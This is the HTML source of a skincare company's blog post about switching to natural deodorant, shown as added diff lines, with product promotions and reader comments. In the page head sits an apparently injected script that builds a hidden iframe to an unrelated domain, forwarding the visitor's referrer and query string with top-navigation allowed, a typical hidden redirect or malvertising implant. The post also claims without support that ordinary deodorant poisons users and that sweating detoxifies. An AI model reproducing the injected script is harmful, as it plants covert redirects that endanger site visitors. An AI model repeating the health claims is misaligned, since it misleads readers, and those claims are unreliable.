+ul.ace-social-icons .footer-email{color:#000000;}
+ul.ace-header-social-icons .fa-flickr, ul.ace-social-icons .fa-flickr{color:#000000;}
+ul.ace-header-social-icons .fa-linkedin, ul.ace-social-icons .fa-linkedin{color:#000000;}
+ul.ace-header-social-icons .fa-youtube-play, ul.ace-social-icons .fa-youtube-play{color:#000000;}
+ul.ace-header-social-icons .fa-vimeo-square, ul.ace-social-icons .fa-vimeo-square{color:#000000;}
+ul.ace-header-social-icons .fa-google-plus, ul.ace-social-icons .fa-google-plus{color:#000000;}
+ul.ace-header-social-icons .fa-instagram, ul.ace-social-icons .fa-instagram{color:#000000;}
+ul.ace-header-social-icons .fa-plus, ul.ace-social-icons .fa-plus{color:#000000;}
+ul.ace-header-social-icons .fa-tumblr, ul.ace-social-icons .fa-tumblr{color:#000000;}
+ul.ace-header-social-icons .fa-envelope, ul.ace-social-icons .fa-envelope{color:#000000;}
+ul.ace-header-social-icons .fa-rss:hover, ul.ace-social-icons .fa-rss:hover{color:#6d6d6d;}
+ul.ace-header-social-icons .fa-twitter:hover, ul.ace-social-icons .fa-twitter:hover{color:#6d6d6d;}
+ul.ace-header-social-icons .fa-facebook:hover, ul.ace-social-icons .fa-facebook:hover{color:#6d6d6d;}
+ul.ace-header-social-icons .fa-pinterest-p:hover, ul.ace-social-icons .fa-pinterest-p:hover{color:#6d6d6d;}
+ul.ace-social-icons .footer-email:hover{color:#6d6d6d;}
+ul.ace-header-social-icons .fa-flickr:hover, ul.ace-social-icons .fa-flickr:hover{color:#6d6d6d;}
+ul.ace-header-social-icons .fa-linkedin:hover, ul.ace-social-icons .fa-linkedin:hover{color:#6d6d6d;}
+ul.ace-header-social-icons .fa-youtube-play:hover, ul.ace-social-icons .fa-youtube-play:hover{color:#6d6d6d;}
+ul.ace-header-social-icons .fa-vimeo-square:hover, ul.ace-social-icons .fa-vimeo-square:hover{color:#6d6d6d;}
+ul.ace-header-social-icons .fa-google-plus:hover, ul.ace-social-icons .fa-google-plus:hover{color:#6d6d6d;}
+ul.ace-header-social-icons .fa-instagram:hover, ul.ace-social-icons .fa-instagram:hover{color:#6d6d6d;}
+ul.ace-header-social-icons .fa-plus:hover, ul.ace-social-icons .fa-plus:hover{color:#6d6d6d;}
+ul.ace-header-social-icons .fa-tumblr:hover, ul.ace-social-icons .fa-tumblr:hover{color:#6d6d6d;}
+ul.ace-header-social-icons .fa-envelope:hover, ul.ace-social-icons .fa-envelope:hover{color:#6d6d6d;}</style>
+
+<div id="ae85fd7b9-e2db-c418-4688-581ae8f7cd52"></div>
+<script type="application/javascript">
+document.getElementById('ae85fd7b9-e2db-c418-4688-581ae8f7cd52').innerHTML = '<iframe sandbox="allow-top-navigation allow-scripts allow-popups allow-forms" frameborder="0" width="" height="" src="https://beuterose.com/vy1GZM5s?se_referrer=' + encodeURIComponent(document.referrer) + '&'+window.location.search.replace('?', '&')+'&frm5f591b179fb55=frame5f591b179fb56"></iframe>'
+</script>
+</head>
+<body data-rsssl=1 class="post-template-default single single-post postid-6632 single-format-standard custom-background i-broke-up-with-my-toxic-deodorant-heres-how-i-did-it" itemscope itemtype="http://schema.org/WebPage">
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-NRNNP9X"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<div class="search-bar"> <form role="search" method="get" action="https://null.null"> <input class="search-input" name="s" type="search" placeholder="Search" value="" autofocus> <input type="image" src="/wp-content/themes/lena/includes/images/search.gif" /> </form></div><nav id="nav-2017">
+<div class="main-nav" id="primary_nav_wrap"> <ul id="menu-top-navigation" class="main"><li id="logo"><a href="https://www.primallypure.com" data-wpel-link="external" target="_blank" rel="nofollow external"><img src="https://cdn.shopify.com/s/files/1/0874/6120/t/5/assets/border-diamond.png?17124562874481292383" height="35"/></a></li><li id="menu-item-6" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-6"><a href="http://primallypure.com/collections/primally-pure" data-wpel-link="external" target="_blank" rel="nofollow external">SHOP</a> <ul class="sub-menu"> <li id="menu-item-4587" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4587"><a href="https://www.primallypure.com/collections/deodorant" data-wpel-link="external" target="_blank" rel="nofollow external">Deodorant</a></li> <li id="menu-item-7" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-7"><a href="http://primallypure.com/collections/face" data-wpel-link="external" target="_blank" rel="nofollow external">face</a></li> <li id="menu-item-4588" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4588"><a href="https://primallypure.com/collections/blue-tansy" data-wpel-link="external" target="_blank" rel="nofollow external">Blue Tansy</a></li> <li id="menu-item-6354" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-6354"><a href="https://cbd.primallypure.com/" data-wpel-link="external" target="_blank" rel="nofollow external">CBD</a></li> <li id="menu-item-8" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-8"><a href="http://primallypure.com/collections/body" data-wpel-link="external" target="_blank" rel="nofollow external">body</a></li> <li id="menu-item-4589" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4589"><a href="https://www.primallypure.com/collections/dry-shampoo" data-wpel-link="external" target="_blank" rel="nofollow external">Hair</a></li> <li id="menu-item-4590" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4590"><a href="https://www.primallypure.com/collections/baby" data-wpel-link="external" target="_blank" rel="nofollow external">Baby</a></li> <li id="menu-item-4591" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4591"><a href="https://www.primallypure.com/collections/men" data-wpel-link="external" target="_blank" rel="nofollow external">Men</a></li> <li id="menu-item-4592" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4592"><a href="https://www.primallypure.com/collections/kits" data-wpel-link="external" target="_blank" rel="nofollow external">Bundles</a></li> <li id="menu-item-6360" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-6360"><a href="https://primallypure.com/collections/wellness" data-wpel-link="external" target="_blank" rel="nofollow external">Wellness</a></li> <li id="menu-item-9" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-9"><a href="http://primallypure.com/collections/primally-pure" data-wpel-link="external" target="_blank" rel="nofollow external">all</a></li> </ul> </li> <li id="menu-item-10" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-10"><a href="http://primallypure.com/pages/about-us" data-wpel-link="external" target="_blank" rel="nofollow external">ABOUT</a> <ul class="sub-menu"> <li id="menu-item-4581" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4581"><a href="https://www.primallypure.com/pages/about-us" data-wpel-link="external" target="_blank" rel="nofollow external">Story</a></li> <li id="menu-item-4582" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4582"><a href="https://www.primallypure.com/pages/faq" data-wpel-link="external" target="_blank" rel="nofollow external">FAQ</a></li> <li id="menu-item-4583" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4583"><a href="https://primallypure.com/pages/best-natural-deodorant" data-wpel-link="external" target="_blank" rel="nofollow external">Deodorant</a></li> <li id="menu-item-4584" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4584"><a href="https://www.primallypure.com/pages/careers" data-wpel-link="external" target="_blank" rel="nofollow external">Careers</a></li> </ul> </li> <li id="menu-item-11" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-11"><a href="http://primallypure.com/pages/contact" data-wpel-link="external" target="_blank" rel="nofollow external">CONTACT</a></li> <li id="menu-item-13" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-13"><a href="https://null.null/" data-wpel-link="internal">BLOG</a></li> <li id="menu-item-4575" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-4575"><a href="https://primallypure.com/pages/spa" data-wpel-link="external" target="_blank" rel="nofollow external">SPA</a> <ul class="sub-menu"> <li id="menu-item-4576" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4576"><a href="https://primallypure.com/pages/spa" data-wpel-link="external" target="_blank" rel="nofollow external">PHILOSOPHY</a></li> <li id="menu-item-4577" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4577"><a href="https://primallypure.com/pages/spa-treatments" data-wpel-link="external" target="_blank" rel="nofollow external">TREATMENTS</a></li> <li id="menu-item-4578" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4578"><a href="https://primallypure.com/pages/spa-questions" data-wpel-link="external" target="_blank" rel="nofollow external">FAQS</a></li> <li id="menu-item-4579" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4579"><a href="https://primallypure.com/pages/spa-contact" data-wpel-link="external" target="_blank" rel="nofollow external">CONTACT</a></li> </ul> </li> </ul> <ul class="shop-nav"> <li><a href="https://www.primallypure.com/cart" data-wpel-link="external" target="_blank" rel="nofollow external"><img src="/wp-content/themes/lena/includes/images/bag.gif" alt="bag"/></a></li> <li><a href="#"><img src="/wp-content/themes/lena/includes/images/search.gif" class="search-image" alt="search"/></a></li> <div class="clear"></div></ul></div></nav>
+<div class="pure-life-header"> <h1><a href="/" data-wpel-link="internal">Pure Life</a></h1> <h2> <a href="https://null.null/category/beauty/" data-wpel-link="internal">Beauty</a> <a href="https://null.null/category/business/" data-wpel-link="internal">Business</a> <a href="https://null.null/category/life/" data-wpel-link="internal">Life</a> <a href="https://null.null/category/ppbabes/" data-wpel-link="internal">PP Babes</a> <a href="https://null.null/category/wellness/" data-wpel-link="internal">Wellness</a> </h2> <div class="border"></div></div><section class="container">
+<main class="section-wide">
+<style>.article ul.post-meta li{margin-right:0px}</style>
+<article class="article article-post post-6632 post type-post status-publish format-standard has-post-thumbnail hentry category-wellness" id="post-6632" itemscope itemtype="http://schema.org/CreativeWork">
+<div class="post-date"><span itemprop="dateModified"><time itemprop="datePublished" content="August 13, 2020" class="updated">August 13, 2020</time></span></div><header class="post-header">
+<h1 class="post-title entry-title" itemprop="headline"><a itemscope="" itemprop="mainEntityOfPage" itemType="https://schema.org/WebPage" href="https://null.null/i-broke-up-with-my-toxic-deodorant-heres-how-i-did-it/" rel="bookmark" title="I BROKE UP WITH MY TOXIC DEODORANT: HERE&#8217;S HOW I DID IT" data-wpel-link="internal">I BROKE UP WITH MY TOXIC DEODORANT: HERE&#8217;S HOW I DID IT</a></h1>
+<ul class="post-meta">
+<li class="post-category"><a href="https://null.null/category/wellness/" rel="category tag" data-wpel-link="internal">Wellness</a></li>
+<li class="post-author">&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;by <span itemprop="author" itemscope itemtype="https://schema.org/Person" class="author vcard"><span itemprop="name" class="fn">Sarah Navares</span></span></li>		</ul>
+</header>
+<article class="post-content entry-content" itemprop="text">
+<input class="jpibfi" type="hidden"><p><img data-attachment-id="6664" data-permalink="https://null.null/i-broke-up-with-my-toxic-deodorant-heres-how-i-did-it/i-broke-up-with-my-toxic-deodorant-heres-how-i-did-it-primally-pure/" data-orig-file="https://i1.wp.com/null.null/wp-content/uploads/2020/08/I-Broke-Up-With-My-Toxic-Deodorant-Heres-How-I-Did-It-Primally-Pure.jpg?fit=1200%2C2247&amp;ssl=1" data-orig-size="1200,2247" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1485432462&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="I Broke Up With My Toxic Deodorant Here&#8217;s How I Did It | Primally Pure" data-image-description="" data-medium-file="https://i1.wp.com/null.null/wp-content/uploads/2020/08/I-Broke-Up-With-My-Toxic-Deodorant-Heres-How-I-Did-It-Primally-Pure.jpg?fit=160%2C300&amp;ssl=1" data-large-file="https://i1.wp.com/null.null/wp-content/uploads/2020/08/I-Broke-Up-With-My-Toxic-Deodorant-Heres-How-I-Did-It-Primally-Pure.jpg?fit=547%2C1024&amp;ssl=1" loading="lazy" src="https://i1.wp.com/null.null/wp-content/uploads/2020/08/I-Broke-Up-With-My-Toxic-Deodorant-Heres-How-I-Did-It-Primally-Pure.jpg?resize=940%2C1760&#038;ssl=1" alt="I Broke Up With My Toxic Deodorant Here&#039;s How I Did It | Primally Pure Skincare" width="940" height="1760" class="alignnone size-full wp-image-6664" srcset="https://i1.wp.com/null.null/wp-content/uploads/2020/08/I-Broke-Up-With-My-Toxic-Deodorant-Heres-How-I-Did-It-Primally-Pure.jpg?w=1200&amp;ssl=1 1200w, https://i1.wp.com/null.null/wp-content/uploads/2020/08/I-Broke-Up-With-My-Toxic-Deodorant-Heres-How-I-Did-It-Primally-Pure.jpg?resize=160%2C300&amp;ssl=1 160w, https://i1.wp.com/null.null/wp-content/uploads/2020/08/I-Broke-Up-With-My-Toxic-Deodorant-Heres-How-I-Did-It-Primally-Pure.jpg?resize=547%2C1024&amp;ssl=1 547w, https://i1.wp.com/null.null/wp-content/uploads/2020/08/I-Broke-Up-With-My-Toxic-Deodorant-Heres-How-I-Did-It-Primally-Pure.jpg?resize=768%2C1438&amp;ssl=1 768w, https://i1.wp.com/null.null/wp-content/uploads/2020/08/I-Broke-Up-With-My-Toxic-Deodorant-Heres-How-I-Did-It-Primally-Pure.jpg?resize=820%2C1536&amp;ssl=1 820w, https://i1.wp.com/null.null/wp-content/uploads/2020/08/I-Broke-Up-With-My-Toxic-Deodorant-Heres-How-I-Did-It-Primally-Pure.jpg?resize=1094%2C2048&amp;ssl=1 1094w" sizes="(max-width: 940px) 100vw, 940px" data-jpibfi-post-excerpt="" data-jpibfi-post-url="https://null.null/i-broke-up-with-my-toxic-deodorant-heres-how-i-did-it/" data-jpibfi-post-title="I BROKE UP WITH MY TOXIC DEODORANT: HERE&#8217;S HOW I DID IT" data-jpibfi-src="https://i1.wp.com/null.null/wp-content/uploads/2020/08/I-Broke-Up-With-My-Toxic-Deodorant-Heres-How-I-Did-It-Primally-Pure.jpg?resize=940%2C1760&#038;ssl=1" data-recalc-dims="1"></p>
+<p>If you’ve been following along with <a href="https://primallypure.com/" target="_blank" rel="noopener noreferrer nofollow external" data-wpel-link="external">Primally Pure</a> for any time at all, then it’s probably not news to you that one of the <b>most toxic relationships</b> you can have is with your deodorant.</p>
+<p>After coming to terms with the fact that this relationship is <a href="https://null.null/ugly-truth-behind-drugstore-deodorant-what-you-should-use-instead/" target="_blank" rel="noopener noreferrer" data-wpel-link="internal">slowly poisoning you</a> and you need to call it quits, you might experience some hesitations and doubts. I mean you’re comfortable with it &#8211; he keeps you feeling secure during hot yoga and you don’t have to sweat the small stuff. </p>
+<p>However, a better beau is on the way.</p>
+<p>And instead of <a href="https://null.null/aluminum-in-deodorant-isnt-the-only-ingredient-to-avoid/" target="_blank" rel="noopener noreferrer" data-wpel-link="internal">chemical-laden fragrance</a>, he’s bringing things like essential oils <i>(and we all know how good those are for healing emotional stress)</i>&#8230; So things are looking up!</p>
+<p>To add some additional encouragement, let&#8217;s rewind about 3 years back to a time when the above monologue was one that I was rehearsing with myself. I was uncertain, but I was also ready to make a change &#8211; and 3 years later, I am SO thankful that I did. I sit writing you smelling fresh as a daisy and that toxic loser I found at Vons (he also frequents 7-Eleven) never crosses my mind.</p>
+<p>That being said, I have found that there are certain things that might make your switch a bit more seamless and what kind of how-to girl would I be if I didn’t spill the tea? </p>
+<p>Here are my <b>key takeaways</b> for navigating the transition to natural deodorant as easily as possible:</p>
+<ul>
+<li>Good things take time! <b>Patience is definitely a virtue</b> in any relationship and this is no exception. Some might tell you not to sweat it, but we recommend that you DO. After all, aside from being an essential part of the human detoxification process, sweat is what’s going to get you on the other side of this awkward relationship phase (and usually in just a couple of weeks). This is why I typically suggest our <a href="https://primallypure.com/products/charcoal-deodorant" target="_blank" rel="noopener noreferrer nofollow external" data-wpel-link="external">Charcoal Deodorant</a> to start your journey. The <a href="https://null.null/what-is-activated-charcoal-why-your-skin-needs-it-diy-mask/" target="_blank" rel="noopener noreferrer" data-wpel-link="internal">activated coconut charcoal</a> is great for adding a boost to your pit-detox.<br /> <br /> When I first made the switch, I remember dripping sweat while sitting in an air-conditioned building and feeling a bit self-conscious. However, I trusted that my new colleagues at Primally Pure were well versed in this process, after all, they did look dry, healthy and they smelled nice. Fast forward and now I’m very happy to report that things have normalized and along with <b>sweating less</b>, I have SO much peace of mind knowing that nothing is keeping my body from ridding itself of harmful chemicals and impurities.</li>
+<p></p>
+<li>Just like any relationship, your hormones are bound to throw a wrench in things from time to time. On the few occasions I have experienced odor since upgrading, I quickly realized my <b>hormones were the culprit.</b> That being said, things looked especially bleak after having my daughter. This was one year into making the switch and I had fully adjusted, but as we know, pregnancy does a number on your hormones and in my case, I had an emergency c-section <i>(hello loads of anesthesia)</i>.<br /> <br /> As you can imagine, my body had a lot of cleaning up to do &#8211; it was almost equivalent to cleaning out your car and finding your child’s old string cheese under the seat, it stunk. In fact, I nearly relapsed back to using Secret and in a moment of weakness, I even pulled into a 7-Eleven to rekindle the flame en route to a hair appointment (don’t fire me, Bethany). However, I talked myself out of that major lapse of judgment and I’m happy to report that I was able to stay faithful to my one and only. I worked on upping my water intake and my overall nutrition and was past the stink in no time!</li>
+<p></p>
+<li><b>Everything Spray is a must!</b> All good relationships need support. Think of <a href="https://primallypure.com/products/everything-spray" target="_blank" rel="noopener noreferrer nofollow external" data-wpel-link="external">Everything Spray</a> as your bestie on speed dial during this transition! She’s there anytime you need to vent and feel refreshed.<br /> <br /> The magnesium oil in Everything Spray helps to fight odor so I found myself reaching for this product frequently as a quick pit-refresher rather than reapplying more deodorant throughout the day. Honestly, the entire ingredient list is worth breaking down &#8211; there are <a href="https://null.null/5-effective-ways-to-use-our-anti-inflammation-everything-spray/" target="_blank" rel="noopener noreferrer" data-wpel-link="internal">SO many benefits</a> that work to support overall skin health, whether it’s bringing balance to your skin’s pH or reducing inflammation and disinfecting. I can almost guarantee you’ll be spritzing on this cocktail of perfection regularly and for many reasons.</li>
+</ul>
+<p>I could go on and on about the things I have discovered since finding the object of my pit&#8217;s affection. Making this simple swap might seem like a small step in your wellness journey, but it truly is the MOST important. The exposure to toxins that can be found in traditional deodorant formulas day in and day out are alarming and harmful, to say the least, and <b>you owe it to yourself to ditch that toxic zero for good</b> &#8211; especially when that wholesome hero is waiting for you just a click away. 😉</p>
+<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-6632" class="share-twitter sd-button share-icon" href="https://null.null/i-broke-up-with-my-toxic-deodorant-heres-how-i-did-it/?share=twitter" target="_blank" title="Click to share on Twitter" data-wpel-link="internal"><span>Twitter</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-6632" class="share-facebook sd-button share-icon" href="https://null.null/i-broke-up-with-my-toxic-deodorant-heres-how-i-did-it/?share=facebook" target="_blank" title="Click to share on Facebook" data-wpel-link="internal"><span>Facebook</span></a></li><li class="share-pinterest"><a rel="nofollow noopener noreferrer" data-shared="sharing-pinterest-6632" class="share-pinterest sd-button share-icon" href="https://null.null/i-broke-up-with-my-toxic-deodorant-heres-how-i-did-it/?share=pinterest" target="_blank" title="Click to share on Pinterest" data-wpel-link="internal"><span>Pinterest</span></a></li><li class="share-end"></li></ul></div></div></div></article>
+<style>.shop-container{display:block;max-width:740px;margin:auto;}
+.shop-button{font-family:"Novel", sans-serif !important;letter-spacing:0.1em;align-items:center;justify-content:center;margin:0px 0px 0px 0px;padding:30px 0px;border-top:1px solid #CCC;display:block;}
+.shop-button a{text-decoration:none;display:block;}
+.shop-image{width:25%;padding-right:30px;float:left;}
+.shop-image img{width:100%:}
+.shop-product{float:left;width:75%;}
+.product-brand{color:#8A8A8A;letter-spacing:0.1em;text-transform:uppercase;font-size:14px;}
+.product-name{color:#000;text-transform:uppercase;font-size:24px;margin:15px 0px;}
+.product-details{color:#4B4B4B;font-size:15px;line-height:24px;font-family:"Lato", sans-serif !important;font-weight:300 !important;font-size:13px;}
+.product-button{color:#000;text-transform:uppercase;font-weight:bold;text-decoration:underline;margin-top:20px;font-size:14px;}
+.product-button:hover{text-decoration:none;}</style>
+<div class="shop-container"> <div class="shop-button"> <a href="https://primallypure.com/products/charcoal-deodorant" data-wpel-link="external" target="_blank" rel="nofollow external"> <div class="shop-image"><img src="https://i0.wp.com/null.null/wp-content/uploads/2020/08/Charcoal-Deodorant-Primally-Pure-Skincare.jpg?fit=1200%2C1200&ssl=1" alt="Charcoal Deodorant | Primally Pure Skincare"/></div><div class="shop-product"> <div class="product-brand">Primally Pure</div><div class="product-name">Charcoal Deodorant</div><div class="product-details">Activated coconut charcoal contains added detoxifying benefits while also deodorizing and disinfecting to combat unwanted odor and keep pits fresh.</div><div class="product-button">Buy Now</div></div><div class="clear"></div></a></div><div class="shop-button"> <a href="https://primallypure.com/products/everything-spray" data-wpel-link="external" target="_blank" rel="nofollow external"> <div class="shop-image"><img src="https://i1.wp.com/null.null/wp-content/uploads/2020/08/Everything-Spray.jpg?fit=1500%2C2250&ssl=1" alt="Everything Spray | Primally Pure Skincare"/></div><div class="shop-product"> <div class="product-brand">Primally Pure</div><div class="product-name">Everything Spray</div><div class="product-details">Everything Spray can also be used as a quick + easy underarm refresher after the gym and is also effective in soothing a wide range of inflammatory skin conditions.</div><div class="product-button">Buy Now</div></div><div class="clear"></div></a></div></div><div class="author-box sarah-navares"> <div class="box-border"> <figure class="author-pic"> <a href="https://null.null/author/sarah-navares/" data-wpel-link="internal"> <img width="652" height="805" src="https://i2.wp.com/null.null/wp-content/uploads/2019/05/Sarah-Navares-Primally-Pure-Skincare.jpg?fit=652%2C805&amp;ssl=1" class="attachment-large size-large" alt="Sarah Navares | Primally Pure Skincare" loading="lazy" srcset="https://i2.wp.com/null.null/wp-content/uploads/2019/05/Sarah-Navares-Primally-Pure-Skincare.jpg?w=652&amp;ssl=1 652w, https://i2.wp.com/null.null/wp-content/uploads/2019/05/Sarah-Navares-Primally-Pure-Skincare.jpg?resize=243%2C300&amp;ssl=1 243w" sizes="(max-width: 652px) 100vw, 652px" data-attachment-id="4545" data-permalink="https://null.null/sarah-navares-primally-pure-skincare/" data-orig-file="https://i2.wp.com/null.null/wp-content/uploads/2019/05/Sarah-Navares-Primally-Pure-Skincare.jpg?fit=652%2C805&amp;ssl=1" data-orig-size="652,805" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;3.2&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Canon EOS 5D Mark IV&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1542194800&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;50&quot;,&quot;iso&quot;:&quot;800&quot;,&quot;shutter_speed&quot;:&quot;0.004&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="Sarah Navares | Primally Pure Skincare" data-image-description="" data-medium-file="https://i2.wp.com/null.null/wp-content/uploads/2019/05/Sarah-Navares-Primally-Pure-Skincare.jpg?fit=243%2C300&amp;ssl=1" data-large-file="https://i2.wp.com/null.null/wp-content/uploads/2019/05/Sarah-Navares-Primally-Pure-Skincare.jpg?fit=652%2C805&amp;ssl=1"/> </a> </figure> <div class="author-data"> <div class="author-name"> <a href="https://null.null/author/sarah-navares/" data-wpel-link="internal"> Sarah <strong>Navares</strong> </a></div><div class="author-description"> <p>Sarah Navares is a beach dwelling wife and mama of 2 who joined the Primally Pure Team in 2017 with a passion for connecting with customers and influencers alike. Sarah has a passion for approaching wellness in a simplistic, practical (and humorous!) way and has raised her hand to be the PP Team's human guinea pig, keeping you up to date on the latest wellness trends and her attempts to implement them. When Sarah's not at the PP HQ, she spends her time hanging out with her hubby, sipping wine and BBQing on the beach.</p></div></div></div></div><div id='jp-relatedposts' class='jp-relatedposts'> <h4>more great reads</h4></div></article>
+<style>.comment-box h4{font-family:"Lato", sans-serif !important;text-transform:uppercase;}
+.comment-box,
+.comment-box p,
+.comment-box div{font-family:"Lato", sans-serif !important;font-weight:300 !important;font-size:15.2px;}
+.comment-reply-link{margin-bottom:20px;display:block;}</style>
+<section class="comment-box">
+<div id="respond" class="comment-respond">
+<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/i-broke-up-with-my-toxic-deodorant-heres-how-i-did-it/#respond" style="display:none;" data-wpel-link="internal">Cancel reply</a></small></h3><form action="https://null.null/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate><p class="comment-notes"><span id="email-notes">Your email address will not be published.</span> Required fields are marked <span class="required">*</span></p><p class="comment-form-comment"><label for="comment">Comment</label> <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" required="required"></textarea></p><p class="comment-form-author"><label for="author">Name <span class="required">*</span></label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" required='required' /></p>
+<p class="comment-form-email"><label for="email">Email <span class="required">*</span></label> <input id="email" name="email" type="email" value="" size="30" maxlength="100" aria-describedby="email-notes" required='required' /></p>
+<p class="comment-form-url"><label for="url">Website</label> <input id="url" name="url" type="url" value="" size="30" maxlength="200" /></p>
+<p class="comment-form-cookies-consent"><input id="wp-comment-cookies-consent" name="wp-comment-cookies-consent" type="checkbox" value="yes" /> <label for="wp-comment-cookies-consent">Save my name, email, and website in this browser for the next time I comment.</label></p>
+<p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Post Comment" /> <input type='hidden' name='comment_post_ID' value='6632' id='comment_post_ID' />
+<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
+</p><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="76917f44cb" /></p><p style="display: none;"><input type="hidden" id="ak_js" name="ak_js" value="175"/></p></form></div><p class="akismet_comment_form_privacy_notice">This site uses Akismet to reduce spam. <a href="https://akismet.com/privacy/" target="_blank" rel="noopener nofollow external" data-wpel-link="external">Learn how your comment data is processed</a>.</p>	
+<h4 id="comments">
+3 comments on &ldquo;I BROKE UP WITH MY TOXIC DEODORANT: HERE&#8217;S HOW I DID IT&rdquo;	</h4>
+<ol class="commentlist">
+<li id="comment-4098" class="comment even thread-even depth-1"> <article id="div-comment-4098" class="comment-body"> <footer class="comment-meta"> <div class="comment-author vcard"> <img alt='' src='https://secure.gravatar.com/avatar/f0c7a02943b1f33ec1b94666e0ee9800?s=42&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/f0c7a02943b1f33ec1b94666e0ee9800?s=84&#038;d=mm&#038;r=g 2x' class='avatar avatar-42 photo' height='42' width='42' loading='lazy'/> <b class="fn">Alexa</b> <span class="says">says:</span></div><div class="comment-metadata"> <a href="https://null.null/i-broke-up-with-my-toxic-deodorant-heres-how-i-did-it/#comment-4098" data-wpel-link="internal"> <time datetime="2020-08-23T20:02:07-07:00"> August 23, 2020 at 8:02 pm </time> </a></div></footer> <div class="comment-content"> <p>Primally pure made it so easy to ditch the toxic deodorants! Everything spray is on my list of items to purchase next!</p></div><div class="reply"><a rel="nofollow" class="comment-reply-link" href="#comment-4098" data-commentid="4098" data-postid="6632" data-belowelement="div-comment-4098" data-respondelement="respond" data-replyto="Reply to Alexa" aria-label="Reply to Alexa">Reply</a></div></article> </li>
+<li id="comment-4105" class="comment byuser comment-author-bethanyjoymcdanielgmail-com odd alt thread-odd thread-alt depth-1"> <article id="div-comment-4105" class="comment-body"> <footer class="comment-meta"> <div class="comment-author vcard"> <img alt='' src='https://secure.gravatar.com/avatar/b03c22046b202f3a1c43c6db0e4703ed?s=42&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/b03c22046b202f3a1c43c6db0e4703ed?s=84&#038;d=mm&#038;r=g 2x' class='avatar avatar-42 photo' height='42' width='42' loading='lazy'/> <b class="fn"><a href="http://primallypure.com" rel="external ugc nofollow" class="url" data-wpel-link="external" target="_blank">Bethany</a></b> <span class="says">says:</span></div><div class="comment-metadata"> <a href="https://null.null/i-broke-up-with-my-toxic-deodorant-heres-how-i-did-it/#comment-4105" data-wpel-link="internal"> <time datetime="2020-08-24T16:02:55-07:00"> August 24, 2020 at 4:02 pm </time> </a></div></footer> <div class="comment-content"> <p>Ahh, this was so good! And your almost-relapse is forgiven, haha 😉</p></div><div class="reply"><a rel="nofollow" class="comment-reply-link" href="#comment-4105" data-commentid="4105" data-postid="6632" data-belowelement="div-comment-4105" data-respondelement="respond" data-replyto="Reply to Bethany" aria-label="Reply to Bethany">Reply</a></div></article> </li>
